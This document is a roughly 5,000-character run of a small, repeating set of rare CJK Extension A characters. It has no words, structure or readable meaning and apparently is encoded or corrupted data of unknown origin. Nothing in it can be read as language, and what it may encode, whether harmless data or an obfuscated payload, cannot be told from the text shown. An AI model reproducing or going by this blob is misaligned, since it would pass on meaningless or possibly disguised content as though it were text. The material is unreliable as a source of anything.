㒦㒠㒥㒤㒥㒘㒤㒞㒣㒠㒢㒤㒢㒘㒡㒜㒠㒡㒟㒤㒟㒙㒞㒜㒝㒢㒜㒤㒞㒘㒛㒜㒚㒠㒙㒦㒙㒘㒘㒝㒗㒠㒙㒟㒦㒘㒦㒞㒤㒠㒣㒤㒣㒛㒢㒜㒤㒦㒠㒤㒠㒘㒟㒜㒟㒢㒣㒥㒝㒘㒜㒠㒛㒠㒢㒚㒚㒘㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒥㒢㒤㒤㒤㒜㒣㒜㒢㒢㒡㒤㒣㒘㒠㒜㒟㒠㒟㒗㒞㒘㒝㒞㒜㒠㒣㒙㒛㒘㒛㒞㒙㒠㒘㒤㒘㒝㒗㒜㒗㒜㒥㒤㒥㒘㒤㒜㒣㒠㒢㒤㒢㒘㒡㒟㒠㒠㒠㒙㒟㒘㒞㒞㒝㒠㒞㒤㒜㒘㒛㒜㒚㒤㒙㒤㒙㒛㒘㒜㒜㒗㒦㒤㒗㒚㒥㒜㒤㒠㒤㒚㒣㒘㒣㒤㒡㒠㒠㒤㒠㒘㒟㒜㒞㒠㒝㒤㒝㒜㒜㒜㒛㒦㒚㒤㒚㒚㒙㒜㒚㒠㒗㒤㒗㒘㒦㒡㒥㒠㒥㒘㒤㒘㒘㒜㒢㒠㒢㒦㒡㒘㒠㒜㒠㒗㒞㒤㒤㒦㒝㒜㒜㒠㒛㒤㒜㒚㒚㒜㒙㒠㒙㒜㒘㒘㒜㒠㒦㒠㒥㒤㒥㒘㒤㒞㒘㒤㒢㒤㒢㒡㒡㒜㒠㒦㒟㒤㒟㒘㒞㒜㒝㒠㒣㒠㒜㒘㒛㒡㒚㒠㒚㒝㒙㒘㒘㒝㒗㒠㒘㒤㒦㒘㒥㒜㒤㒥㒣㒤㒣㒚㒢㒜㒘㒥㒠㒤㒡㒚㒟㒜㒞㒠㒞㒛㒝㒘㒠㒚㒛㒠㒚㒤㒚㒘㒙㒜㒘㒠㒗㒤㒗㒝㒦㒜㒦㒗㒤㒤㒤㒚㒣㒜㒤㒠㒡㒤㒡㒘㒠㒢㒟㒠㒟㒙㒞㒘㒡㒣㒜㒠㒜㒦㒛㒘㒚㒜㒚㒘㒘㒤㒚㒛㒗㒜㒦㒠㒥㒤㒥㒘㒤㒜㒣㒠㒣㒚㒢㒘㒡㒤㒠㒠㒟㒦㒟㒘㒞㒜㒝㒠㒜㒤㒜㒟㒛㒜㒚㒠㒙㒤㒙㒘㒘㒜㒘㒢㒦㒤㒦㒘㒥㒣㒤㒠㒗㒛㒣㒘㒢㒜㒡㒠㒡㒦㒠㒘㒟㒜㒟㒗㒝㒤㒟㒝㒜㒜㒛㒠㒚㒤㒛㒚㒟㒜㒘㒠㒘㒜㒗㒘㒚㒛㒥㒠㒤㒤㒤㒘㒥㒜㒣㒚㒡㒤㒡㒠㒠㒜㒠㒘㒞㒤㒤㒞㒝㒜㒝㒢㒛㒤㒛㒘㒚㒦㒙㒠㒜㒗㒘㒘㒗㒜㒦㒠㒥㒤㒥㒘㒤㒜㒤㒘㒢㒤㒢㒢㒡㒜㒠㒢㒟㒤㒡㒘㒞㒜㒝㒠㒝㒜㒜㒘㒛㒤㒚㒠㒝㒝㒙㒘㒘㒜㒗㒠㒦㒤㒦㒠㒥㒜㒥㒙㒣㒤㒣㒘㒢㒜㒡㒠㒠㒤㒠㒘㒟㒣㒞㒠㒝㒤㒝㒘㒜㒥㒛㒠㒛㒘㒚㒘㒙㒜㒘㒠㒗㒤㒚㒠㒦㒜㒥㒡㒤㒤㒥㒚㒙㒜㒢㒠㒢㒠㒡㒘㒢㒝㒟㒠㒞㒤㒞㒘㒟㒜㒡㒠㒛㒤㒛㒤㒚㒜㒚㒜㒘㒤㒜㒜㒗㒜㒗㒢㒛㒤㒥㒘㒥㒙㒣㒠㒦㒛㒢㒘㒡㒜㒠㒠㒡㒤㒤㒘㒞㒜㒞㒞㒜㒤㒜㒣㒛㒜㒟㒞㒙㒤㒙㒘㒜㒤㒗㒠㒗㒠㒦㒘㒦㒚㒤㒠㒣㒥㒣㒘㒢㒢㒢㒜㒠㒤㒠㒟㒟㒜㒡㒣㒝㒤㒝㒙㒜㒜㒛㒢㒚㒤㒚㒜㒚㒣㒘㒠㒗㒤㒗㒘㒙㒟㒥㒠㒤㒥㒤㒘㒥㒜㒤㒚㒡㒤㒡㒟㒠㒜㒟㒦㒞㒤㒠㒘㒝㒜㒝㒢㒡㒥㒛㒘㒚㒥㒙㒠㒛㒗㒘㒘㒗㒜㒦㒠㒦㒦㒛㒙㒤㒜㒤㒚㒢㒤㒣㒥㒡㒜㒠㒠㒟㒤㒠㒚㒤㒜㒝㒠㒝㒟㒜㒘㒞㒣㒚㒠㒙㒤㒙㒘㒘㒞㒜㒤㒦㒤㒦㒤㒥㒜㒤㒢㒣㒤㒣㒘㒢㒜㒡㒠㒗㒘㒠㒘㒟㒣㒞㒠㒞㒠㒝㒘㒜㒞㒛㒠㒜㒤㒛㒢㒙㒜㒙㒘㒗㒤㒗㒞㒦㒜㒛㒣㒤㒤㒥㒚㒙㒝㒢㒠㒢㒞㒡㒘㒣㒦㒟㒠㒞㒤㒞㒘㒞㒞㒢㒡㒛㒤㒛㒣㒚㒜㒚㒦㒘㒤㒘㒘㒗㒜㒦㒢㒛㒘㒥㒘㒥㒘㒣㒠㒢㒤㒢㒘㒡㒜㒠㒠㒟㒤㒣㒠㒞㒜㒞㒘㒜㒤㒜㒤㒛㒜㒚㒡㒙㒤㒛㒘㒙㒦㒗㒠㒗㒜㒦㒘㒥㒢㒤㒠㒘㒤㒣㒘㒣㒞㒗㒡㒠㒤㒠㒢㒟㒜㒤㒤㒝㒤㒝㒘㒜㒜㒜㒢㒠㒥㒚㒘㒚㒗㒘㒠㒙㒚㒗㒘㒦㒜㒥㒠㒤㒦㒙㒜㒣㒜㒣㒜㒡㒤㒡㒛㒠㒜㒟㒠㒞㒤㒞㒘㒡㒤㒜㒠㒜㒜㒛㒘㒛㒘㒙㒠㒘㒥㒘㒘㒙㒜㒘㒚㒥㒤㒥㒠㒤㒜㒣㒦㒢㒤㒘㒛㒡㒜㒡㒢㒥㒥㒟㒘㒞㒦㒝㒠㒡㒜㒜㒘㒛㒜㒚㒠㒚㒦㒟㒙㒘㒜㒘㒛㒦㒤㒚㒠㒥㒜㒤㒠㒣㒤㒣㒞㒙㒗㒡㒠㒡㒠㒠㒘㒟㒠㒞㒠㒝㒥㒝㒘㒜㒝㒛㒠㒚㒤㒟㒚㒙㒜㒘㒠㒗㒤㒗㒟㒦㒜㒥㒠㒤㒤㒤㒘㒗㒤㒢㒠㒢㒜㒡㒘㒡㒘㒟㒠㒞㒥㒞㒘㒝㒜㒣㒣㒛㒤㒛㒘㒚㒜㒙㒡㒘㒤㒘㒘㒗㒜㒗㒗㒥㒤㒥㒘㒤㒜㒣㒠㒣㒛㒢㒘㒡㒜㒠㒠㒟㒦㒟㒣㒞㒜㒝㒠㒜㒤㒠㒤㒢㒛㒠㒣㒟㒥㒟㒤㒝㒜㒞㒜㒜㒥㒝㒡㒛㒡㒛㒢㒥㒤㒣㒡㒢㒜㒡㒠㒠㒤㒤㒛㒥㒤㒤㒡㒤㒦㒣㒙㒢㒟㒢㒤㒡㒙㒡㒚㒤㒢㒘㒤㒗㒤㒗㒘㒦㒜㒜㒗㒚㒥㒚㒥㒙㒡㒝㒦㒢㒤㒡㒘㒠㒜㒟㒠㒣㒜㒥㒝㒤㒙㒢㒡㒢㒢㒢㒗㒠㒥㒟㒤㒝㒦㒟㒗㒞㒛㒝㒤㒚㒤㒛㒙㒛㒞㒚㒤㒚㒞㒢㒠㒡㒜㒠㒠㒟㒤㒤㒘㒥㒘㒣㒡㒤㒝㒢㒝㒢㒞㒟㒤㒞㒤㒦㒜㒘㒢㒗㒠㒦㒤㒦㒘㒙㒟㒘㒦㒚㒦㒙㒙㒙㒙㒗㒥㒤㒢㒠㒟㒟㒜㒞㒠㒝㒤㒢㒘㒣㒘㒡㒡㒢㒝㒠㒝㒠㒞㒟㒣㒘㒢㒗㒘㒦㒜㒥㒠㒥㒦㒦㒡㒣㒜㒢㒠㒡㒤㒡㒛㒠㒜㒟㒠㒞㒤㒠㒘㒝㒜㒜㒠㒛㒤㒛㒘㒚㒜㒙㒠㒙㒛㒘㒘㒙㒜㒦㒠㒥㒤㒥㒘㒤㒜㒣㒠㒢㒤㒢㒙㒡㒜㒢㒠㒟㒤㒟㒘㒞㒜㒝㒠㒜㒤㒜㒘㒛㒞㒚㒠㒛㒤㒙㒘㒘㒜㒗㒠㒦㒤㒦㒘㒥㒜㒤㒤㒣㒤㒤㒚㒢㒜㒡㒠㒠㒥㒠㒘㒟㒟㒞㒠㒝㒤㒝㒘㒞㒜㒛㒠㒚㒤㒚㒙㒙㒜㒘㒡㒗㒤㒗㒟㒦㒜㒦㒢㒤㒤㒤㒘㒣㒞㒢㒠㒢㒙㒡㒘㒠㒜㒟㒠㒞㒤㒞㒘㒝㒜㒜㒡㒛㒤㒛㒙㒚㒜㒙㒢㒘㒤㒚㒘㒗㒜㒦㒠㒥㒥㒥㒘㒤㒝㒣㒠㒢㒦㒢㒘㒣㒜㒠㒠㒟㒤㒟㒙㒞㒜㒝㒡㒜㒤㒜㒜㒛㒜㒜㒠㒙㒤㒙㒘㒘㒝㒗㒠㒦㒥㒦㒘㒥㒢㒤㒠㒤㒤㒣㒘㒢㒜㒡㒠㒠㒤㒠㒞㒟㒜㒞㒡㒝㒤㒝㒘㒜㒜㒛㒠㒚㒤㒚㒘㒙㒝㒘㒠㒗㒤㒗㒘㒦㒜㒥㒠㒤㒤㒤㒘㒣㒟㒣㒘㒡㒤㒡㒘㒠㒜㒗㒚㒞㒤㒞㒘㒝㒜㒜㒠㒥㒜㒛㒜㒚㒜㒙㒠㒘㒤㒞㒚㒞㒥㒝㒤㒜㒙㒚㒢㒤㒜㒣㒠㒢㒤㒢㒘㒡㒜㒠㒠㒞㒤㒣㒗㒞㒞㒞㒜㒜㒤㒜㒘㒛㒜㒢㒘㒞㒦㒠㒚㒟㒥㒛㒤㒛㒣㒚㒠㒙㒦㒙㒦㒘㒡㒙㒚㒙㒗㒠㒢㒡㒘㒠㒘㒟㒜㒞㒠㒤㒗㒣㒠㒢㒝㒢㒢㒢㒜㒚㒘㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒜㒠㒘㒤㒗㒦㒣㒟㒢㒠㒡㒤㒡㒘㒗㒟㒦㒥㒤㒦㒝㒚㒝㒢㒜㒠㒛㒤㒛㒘㒡㒟㒠㒤㒟㒦㒞㒡㒞㒚㒝㒗㒗㒥㒥㒘㒤㒜㒣㒠㒣㒦㒘㒘㒡㒜㒠㒣㒟㒤㒟㒜㒞㒜㒝㒠㒜㒤㒜㒘㒟㒗㒚㒠㒚㒗㒙㒘㒘㒟㒗㒠㒦㒥㒦㒘㒥㒢㒛㒚㒣㒤㒣㒛㒢㒜㒢㒗㒠㒤㒠㒙㒟㒜㒞㒠㒝㒤㒝㒜㒝㒣㒛㒠㒚㒤㒚㒘㒙㒣㒘㒠㒗㒥㒗㒘㒗㒞㒛㒠㒤㒤㒤㒛㒣㒜㒢㒤㒡㒤㒡㒘㒠㒜㒟㒠㒢㒟㒞㒘㒝㒟㒜㒠㒜㒗㒛㒘㒚㒝㒙㒠㒘㒤㒞㒗㒗㒜㒦㒣㒥㒤㒥㒚㒤㒜㒣㒠㒢㒤㒣㒚㒗㒝㒠㒠㒠㒗㒟㒘㒞㒟㒝㒠㒜㒤㒜㒘㒜㒞㒡㒞㒙㒤㒙㒜㒘㒜㒗㒡㒦㒤㒦㒘㒥㒜㒥㒢㒣㒤㒣㒘㒢㒡㒡㒠㒡㒗㒠㒘㒟㒜㒞㒠㒝㒤㒝㒘㒜㒜㒛㒦㒚㒤㒚㒘㒙㒜㒘㒠㒗㒤㒘㒚㒦㒜㒥㒠㒥㒛㒤㒘㒣㒟㒢㒠㒡㒤㒡㒘㒠㒠㒟㒠㒞㒤㒞㒝㒝㒜㒞㒝㒛㒤㒛㒙㒚㒜㒙㒠㒞㒠㒘㒘㒗㒥㒦㒠㒦㒘㒥㒘㒤㒜㒣㒠㒣㒦㒘㒝㒡㒜㒡㒚㒟㒤㒟㒠㒞㒜㒝㒠㒜㒤㒞㒘㒛㒜㒚㒠㒚㒞㒙㒘㒘㒦㒗㒠㒗㒙㒦㒘㒗㒜㒤㒠㒣㒤㒣㒣㒢㒜㒡㒠㒠㒤㒠㒟㒟㒜㒞㒠㒝㒤㒝㒘㒝㒙㒛㒠㒛㒜㒚㒘㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒦㒞㒤㒤㒤㒠㒣㒜㒢㒠㒡㒤㒡㒘㒠㒜㒟㒠㒟㒟㒞㒘㒞㒚㒜㒠㒛㒦㒛㒘㒜㒜㒙㒠㒘㒤㒘㒣㒗㒜㒗㒛㒥㒤㒥㒚㒤㒜㒣㒠㒢㒤㒢㒘㒢㒗㒠㒠㒟㒦㒟㒘㒞㒞㒝㒠㒜㒤㒜㒘㒛㒜㒛㒛㒙㒤㒙㒣㒘㒜㒗㒣㒦㒤㒘㒘㒥㒜㒤㒠㒤㒟㒣㒘㒣㒗㒡㒠㒡㒚㒠㒘㒟㒜㒞㒠㒝㒤㒝㒢㒜㒜㒛㒢㒚㒤㒚㒚㒙㒜㒘㒠㒗㒤㒗㒘㒦㒠㒥㒠㒥㒝㒤㒘㒣㒦㒢㒠㒡㒤㒡㒘㒠㒜㒠㒙㒞㒤㒞㒛㒝㒜㒜㒢㒛㒤㒝㒘㒚㒜㒙㒠㒙㒗㒘㒘㒗㒥㒦㒠㒦㒚㒥㒘㒤㒠㒘㒚㒢㒤㒢㒝㒡㒜㒡㒝㒟㒤㒟㒙㒞㒜㒞㒢㒢㒤㒜㒘㒛㒡㒚㒠㒚㒘㒙㒘㒘㒜㒗㒠㒦㒤㒗㒗㒥㒜㒤㒥㒣㒤㒣㒙㒢㒜㒡㒤㒠㒤㒠㒘㒥㒛㒞㒠㒞㒘㒝㒘㒜㒞㒛㒠㒚㒤㒚㒘㒙㒜㒟㒣㒗㒤㒗㒘㒦㒜㒥㒡㒤㒤㒤㒘㒣㒜㒢㒠㒡㒤㒡㒘㒠㒜㒟㒡㒞㒥㒞㒘㒝㒜㒜㒠㒡㒠㒛㒠㒚㒜㒙㒠㒘㒤㒝㒘㒞㒘㒜㒡㒝㒝㒛㒝㒛㒞㒘㒤㒗㒤㒢㒚㒡㒜㒠㒠㒟㒤㒠㒚㒡㒙㒝㒠㒜㒤㒜㒘㒛㒝㒚㒠㒙㒤㒙㒘㒘㒜㒞㒣㒦㒤㒦㒘㒥㒜㒤㒡㒣㒤㒣㒘㒢㒜㒡㒠㒠㒤㒠㒘㒟㒜㒞㒡㒞㒞㒝㒘㒜㒜㒛㒠㒠㒠㒚㒣㒙㒜㒘㒠㒗㒤㒛㒤㒝㒛㒛㒣㒚㒥㒚㒤㒘㒜㒙㒜㒗㒥㒘㒡㒦㒡㒦㒢㒢㒢㒞㒟㒝㒜㒜㒠㒛㒤㒠㒘㒡㒘㒟㒡㒠㒝㒞㒝㒞㒞㒝㒣㒗㒤㒥㒚㒤㒜㒣㒠㒢㒤㒘㒗㒥㒣㒟㒢㒠㒘㒟㒘㒞㒜㒝㒠㒤㒛㒢㒙㒡㒥㒡㒤㒛㒤㒙㒞㒘㒜㒗㒠㒦㒤㒚㒛㒙㒢㒛㒢㒙㒥㒙㒥㒘㒡㒗㒜㒡㒝㒠㒘㒟㒜㒞㒠㒢㒗㒣㒠㒢㒝㒢㒢㒠㒥㒠㒛㒠㒠㒞㒥㒞㒦㒚㒦㒗㒜㒥㒠㒤㒤㒤㒘㒗㒤㒙㒥㒘㒡㒗㒙㒗㒚㒦㒟㒥㒝㒤㒜㒢㒞㒣㒟㒢㒣㒢㒜㒟㒜㒟㒡㒟㒦㒟㒜㒗㒞㒗㒘㒥㒤㒥㒘㒤㒜㒘㒠㒙㒠㒘㒙㒘㒥㒦㒥㒦㒦㒤㒜㒣㒜㒜㒢㒝㒜㒜㒘㒛㒜㒚㒠㒟㒘㒞㒘㒝㒜㒞㒜㒜㒥㒝㒡㒛㒡㒛㒢㒝㒜㒣㒜㒢㒜㒡㒠㒠㒤㒦㒟㒥㒝㒥㒝㒤㒙㒞㒟㒜㒜㒛㒠㒚㒤㒛㒚㒟㒜㒘㒠㒗㒥㒗㒘㒦㒟㒥㒠㒤㒤㒤㒘㒤㒜㒣㒛㒡㒤㒡㒙㒠㒜㒠㒙㒞㒤㒞㒘㒝㒜㒝㒢㒡㒤㒛㒘㒚㒝㒙㒠㒙㒗㒘㒘㒗㒜㒦㒠㒗㒤㒚㒘㒤㒜㒣㒡㒢㒤㒢㒙㒡㒜㒡㒙㒟㒤㒟㒞㒤㒦㒝㒠㒜㒥㒜㒘㒜㒢㒚㒠㒙㒥㒙㒘㒘㒜㒗㒠㒗㒘㒗㒟㒥㒜㒤㒠㒣㒤㒤㒞㒢㒜㒡㒡㒠㒤㒡㒚㒥㒜㒞㒠㒝㒥㒝㒘㒜㒠㒛㒠㒚㒤㒚㒘㒙㒜㒚㒣㒗㒤㒗㒙㒦㒜㒥㒡㒤㒤㒤㒙㒣㒜㒣㒢㒡㒤㒡㒘㒠㒝㒟㒠㒟㒞㒞㒘㒝㒜㒜㒠㒝㒤㒛㒘㒚㒜㒙㒡㒘㒤㒘㒙㒗㒜㒦㒢㒥㒤㒗㒘㒤㒜㒣㒠㒢㒥㒢㒘㒡㒝㒠㒠㒟㒥㒟㒘㒠㒜㒝㒠㒜㒤㒜㒙㒛㒜㒚㒡㒙㒤㒙㒞㒘㒜㒙㒠㒦㒤㒦㒘㒥㒝㒤㒠㒣㒥㒣㒘㒢㒣㒡㒠㒡㒦㒠㒘㒟㒜㒞㒢㒝㒤㒝㒢㒜㒜㒛㒠㒚㒤㒜㒘㒙㒜㒘㒠㒗㒦㒗㒘㒦㒞㒥㒠㒤㒦㒤㒘㒤㒞㒢㒠㒡㒤㒡㒛㒠㒜㒠㒘㒞㒤㒞㒘㒝㒜㒜㒠㒛㒤㒛㒘㒚㒞㒙㒠㒘㒦㒘㒘㒗㒟㒦㒠㒗㒤㒥㒘㒤㒜㒣㒢㒢㒤㒢㒚㒡㒜㒠㒦㒟㒤㒡㒘㒞㒜㒝㒠㒜㒦㒜㒘㒛㒞㒚㒠㒚㒛㒙㒘㒚㒜㒗㒠㒦㒤㒦㒚㒥㒜㒤㒢㒣㒤㒣㒝㒢㒜㒢㒠㒠㒤㒠㒘㒟㒝㒞㒠㒞㒙㒝㒘㒜㒞㒛㒠㒛㒘㒚㒘㒙㒜㒘㒠㒗㒤㒗㒚㒦㒜㒥㒡㒤㒤㒤㒘㒚㒟㒢㒠㒡㒤㒡㒘㒠㒝㒟㒠㒞㒤㒞㒘㒝㒜㒜㒠㒛㒤㒛㒘㒚㒜㒙㒢㒘㒤㒘㒘㒗㒜㒦㒢㒦㒗㒥㒘㒤㒜㒣㒠㒗㒤㒘㒤㒘㒞㒟㒢㒠㒛㒟㒘㒞㒜㒝㒠㒡㒦㒢㒝㒡㒢㒡㒢㒠㒙㒠㒛㒞㒤㒗㒥㒦㒤㒦㒘㒥㒜㒤㒠㒘㒢㒣㒘㒢㒜㒡㒠㒠㒤㒠㒘㒟㒜㒞㒠㒟㒤㒝㒘㒜㒜㒛㒠㒚㒤㒚㒘㒙㒜㒘㒢㒗㒤㒘㒚㒦㒜㒥㒠㒤㒦㒤㒘㒣㒝㒢㒠㒡㒤㒡㒘㒠㒜㒟㒠㒞㒤㒞㒘㒝㒜㒜㒢㒛㒤㒛㒙㒚㒜㒙㒠㒘㒤㒘㒘㒗㒜㒦㒠㒥㒥㒥㒘㒤㒜㒣㒠㒢㒤㒢㒘㒡㒜㒠㒠㒟㒦㒟㒚㒞㒜㒝㒠㒜㒤㒣㒠㒛㒜㒚㒠㒙㒤㒙㒘㒘㒜㒗㒠㒦㒤㒦㒘㒞㒤㒤㒥㒣㒤㒣㒘㒢㒜㒘㒠㒗㒗㒦㒙㒦㒘㒥㒜㒟㒡㒝㒘㒜㒜㒛㒠㒛㒦㒠㒙㒙㒜㒘㒢㒗㒤㒗㒙㒦㒜㒥㒠㒤㒤㒥㒚㒙㒝㒢㒠㒢㒗㒡㒘㒠㒝㒟㒠㒞㒤㒞㒘㒞㒞㒢㒠㒛㒤㒛㒜㒚㒜㒙㒢㒘㒤㒘㒘㒗㒜㒦㒦㒜㒟㒥㒘㒤㒡㒣㒠㒢㒤㒢㒘㒡㒝㒠㒠㒠㒘㒟㒘㒞㒜㒢㒢㒜㒤㒜㒘㒛㒜㒚㒢㒙㒤㒙㒘㒘㒜㒗㒠㒛㒦㒦㒘㒥㒜㒤㒠㒣㒤㒣㒘㒢㒜㒡㒠㒠㒤㒥㒚㒟㒜㒞㒠㒝㒤㒝㒛㒜㒜㒛㒠㒚㒤㒚㒘㒞㒞㒘㒠㒗㒤㒗㒘㒦㒝㒥㒠㒤㒤㒤㒘㒣㒜㒥㒘㒡㒤㒡㒜㒠㒜㒟㒢㒞㒤㒞㒙㒝㒜㒜㒦㒝㒗㒛㒘㒚㒜㒙㒠㒚㒝㒘㒘㒗㒝㒦㒠㒥㒥㒥㒘㒤㒠㒥㒗㒢㒤㒢㒘㒡㒜㒢㒙㒟㒤㒟㒙㒞㒜㒝㒦㒞㒗㒜㒘㒛㒜㒚㒠㒛㒝㒙㒘㒘㒝㒗㒠㒦㒥㒦㒘㒥㒠㒦㒗㒣㒤㒣㒘㒢㒜㒣㒙㒠㒤㒠㒙㒟㒜㒞㒦㒟㒗㒝㒘㒜㒝㒛㒠㒜㒝㒚㒘㒙㒝㒘㒠㒗㒤㒗㒘㒦㒠㒗㒗㒤㒤㒤㒘㒣㒜㒤㒙㒡㒤㒡㒙㒠㒜㒟㒠㒣㒠㒞㒘㒝㒠㒜㒠㒛㒦㒛㒘㒚㒟㒙㒠㒘㒤㒜㒤㒗㒜㒦㒥㒥㒤㒥㒛㒤㒜㒣㒢㒢㒤㒢㒞㒦㒗㒠㒠㒠㒘㒟㒘㒟㒠㒝㒠㒜㒥㒜㒘㒛㒡㒚㒠㒚㒘㒚㒟㒘㒜㒗㒠㒦㒤㒗㒜㒥㒜㒤㒡㒣㒤㒣㒜㒣㒣㒡㒠㒠㒤㒠㒘㒠㒥㒞㒠㒝㒥㒝㒘㒜㒜㒠㒜㒚㒤㒚㒜㒙㒜㒘㒢㒗㒤㒗㒛㒦㒜㒥㒠㒙㒠㒤㒘㒣㒡㒢㒠㒢㒗㒡㒘㒠㒞㒟㒠㒟㒚㒟㒛㒝㒜㒜㒤㒛㒤㒜㒡㒚㒜㒙㒡㒘㒤㒘㒝㒗㒜㒦㒤㒗㒛㒥㒘㒤㒜㒣㒠㒤㒝㒢㒘㒡㒝㒠㒠㒠㒘㒠㒟㒞㒜㒝㒠㒜㒤㒝㒢㒛㒜㒚㒡㒙㒤㒙㒘㒞㒙㒗㒠㒗㒘㒦㒘㒥㒜㒤㒠㒣㒤㒣㒘㒢㒜㒣㒙㒠㒤㒠㒜㒟㒜㒞㒡㒝㒤㒝㒘㒜㒜㒛㒠㒠㒣㒚㒘㒙㒠㒘㒠㒗㒦㒗㒘㒦㒜㒥㒠㒤㒤㒛㒛㒣㒜㒢㒠㒡㒤㒡㒙㒠㒜㒟㒠㒞㒤㒞㒙㒝㒜㒜㒠㒛㒤㒛㒘㒚㒜㒙㒠㒘㒤㒘㒘㒗㒣㒦㒠㒥㒤㒥㒘㒤㒜㒥㒟㒢㒤㒢㒘㒡㒜㒠㒡㒟㒤㒟㒘㒞㒜㒝㒠㒜㒤㒜㒘㒛㒜㒚㒠㒙㒤㒙㒘㒘㒜㒗㒠㒦㒤㒦㒘㒥㒜㒤㒠㒣㒤㒣㒘㒢㒜㒡㒠㒠㒤㒠㒘㒟㒜㒞㒠㒝㒤㒝㒘㒜㒟㒛㒠㒚㒤㒚㒘㒙㒜㒘㒠㒗㒤㒗㒘㒦㒜㒥㒠㒤㒤㒤㒘㒣㒜㒢㒠㒡㒤㒡㒘㒠㒜㒟㒠㒞㒦㒞㒘㒝㒜㒜㒠㒛㒤㒛㒘㒚㒜㒙㒠㒘㒤㒘㒙㒗㒜㒦㒠㒥㒤㒥㒘㒤㒜㒣㒠㒢㒤㒢㒙㒤㒠㒠㒠㒟㒤㒟㒘㒢㒚㒝㒤㒜㒤㒜㒘㒛㒜㒟㒠㒟㒥㒠㒚㒟㒠㒟㒘㒣㒛㒙㒥㒡㒟㒠㒟㒣㒟㒣㒗㒡㒛㒥㒟㒢㒤㒠㒟㒟㒜㒞㒠㒝㒤㒣㒛㒣㒛㒢㒞㒡㒢㒠㒝㒟㒟㒟㒤㒦㒤㒜㒜㒘㒘㒛㒗㒜㒤㒤㒟㒞㒛㒗㒢㒥㒣㒡㒘㒦㒤㒛㒠㒥㒢㒦㒗㒙㒘㒠㒙㒡㒟㒗㒗㒙㒞㒚㒙㒘㒤㒘㒘㒗㒜㒜㒗㒜㒣㒜㒚㒛㒗㒚㒣㒙㒤㒘㒙㒗㒟㒦㒥㒥㒠㒟㒜㒞㒜㒝㒠㒜㒤㒡㒚㒡㒝㒠㒣㒠㒙㒙㒜㒘㒝㒦㒢㒗㒗㒦㒘㒥㒜㒤㒠㒚㒢㒙㒝㒙㒣㒗㒚㒠㒤㒠㒘㒟㒜㒞㒠㒝㒤㒝㒘㒜㒜㒛㒠㒚㒦㒚㒞㒙㒜㒘㒠㒗㒤㒜㒛㒜㒟㒜㒢㒛㒝㒛㒘㒚㒠㒢㒢㒢㒟㒡㒘㒠㒜㒟㒠㒣㒠㒥㒗㒣㒟㒢㒡㒢㒠㒠㒘㒡㒘㒟㒡㒠㒝㒞㒝㒞㒞㒞㒚㒦㒗㒥㒘㒤㒜㒣㒠㒗㒝㒙㒛㒥㒝㒢㒞㒙㒗㒤㒞㒝㒢㒙㒠㒛㒦㒥㒟㒠㒦㒞㒟㒗㒘㒙㒞㒘㒜㒗㒠㒦㒤㒚㒝㒜㒚㒛㒗㒚㒝㒙㒦㒘㒡㒠㒠㒠㒤㒠㒘㒟㒜㒞㒠㒝㒤㒝㒘㒜㒜㒟㒠㒜㒢㒘㒤㒣㒘㒛㒞㒙㒤㒚㒟㒤㒥㒟㒠㒠㒣㒙㒢㒡㒘㒦㒙㒥㒤㒝㒗㒚㒝㒘㒢㒤㒗㒚㒗㒘㒢㒜㒡㒛㒤㒛㒘㒚㒜㒜㒥㒚㒤㒘㒣㒗㒜㒦㒠㒥㒤㒙㒟㒚㒡㒚㒤㒗㒗㒘㒠㒗㒥㒗㒜㒦㒘㒦㒚㒤㒡㒤㒞㒘㒚㒜㒢㒛㒜㒚㒠㒙㒤㒝㒟㒞㒡㒞㒤㒜㒗㒜㒝㒜㒞㒛㒦㒚㒝㒙㒛㒘㒡㒞㒤㒡㒘㒠㒘㒟㒜㒞㒠㒢㒢㒣㒙㒣㒙㒡㒥㒚㒘㒚㒘㒤㒠㒞㒣㒗㒚㒥㒟㒤㒛㒝㒤㒤㒟㒣㒗㒗㒛㒜㒘㒢㒚㒡㒘㒠㒜㒟㒠㒦㒙㒤㒦㒤㒜㒢㒡㒢㒗㒡㒣㒥㒢㒚㒚㒘㒤㒘㒘㒗㒜㒚㒣㒛㒥㒛㒦㒘㒟㒚㒟㒙㒠㒘㒤㒗㒥㒦㒤㒦㒙㒞㒚㒞㒦㒝㒠㒜㒤㒜㒘㒟㒢㒡㒙㒠㒦㒟㒝㒝㒟㒝㒥㒝㒦㒝㒞㒛㒡㒛㒢㒝㒜㒣㒜㒢㒜㒡㒠㒠㒤㒗㒟㒥㒝㒥㒙㒥㒘㒘㒞㒜㒡㒛㒠㒚㒤㒚㒘㒝㒥㒞㒤㒞㒠㒝㒝㒜㒠㒤㒢㒥㒜㒤㒘㒣㒜㒢㒠㒥㒦㒗㒙㒗㒟㒥㒥㒣㒤㒤㒙㒤㒞㒣㒤㒗㒚㒛㒟㒚㒜㒙㒠㒘㒤㒝㒞㒝㒡㒜㒣㒝㒘㒜㒗㒛㒞㒦㒣㒦㒠㒥㒠㒙㒟㒜㒟㒥㒣㒟㒤㒛㒢㒥㒢㒠㒤㒜㒘㒤㒜㒦㒚㒙㒜㒡㒗㒟㒣㒦㒙㒠㒤㒚㒗㒥㒞㒤㒥㒣㒤㒣㒘㒢㒜㒦㒢㒦㒥㒦㒛㒥㒡㒥㒣㒟㒤㒝㒡㒜㒜㒛㒠㒚㒤㒡㒟㒠㒛㒟㒢㒞㒟㒞㒛㒝㒜㒛㒡㒛㒗㒚㒝㒜㒢㒢㒠㒡㒤㒡㒘㒠㒜㒟㒠㒘㒤㒤㒠㒡㒜㒙㒤㒜㒛㒛㒘㒚㒜㒙㒠㒟㒛㒞㒝㒞㒠㒝㒗㒜㒙㒛㒦㒛㒢㒜㒦㒢㒡㒡㒞㒘㒡㒞㒠㒜㒠㒚㒢㒘㒥㒡㒠㒞㒤㒜㒜㒛㒜㒚㒠㒙㒤㒞㒞㒟㒛㒞㒤㒝㒙㒦㒚㒦㒚㒤㒠㒣㒤㒣㒘㒦㒣㒗㒥㒘㒘㒤㒜㒥㒡㒥㒣㒤㒗㒣㒝㒣㒚㒡㒤㒠㒥㒠㒦㒠㒠㒟㒣㒗㒦㒗㒟㒦㒜㒥㒠㒤㒤㒘㒟㒚㒞㒘㒡㒙㒚㒗㒡㒗㒠㒗㒙㒢㒢㒞㒜㒝㒜㒜㒠㒛㒤㒡㒟㒠㒝㒠㒝㒟㒙㒝㒤㒗㒣㒦㒠㒥㒤㒥㒘㒙㒜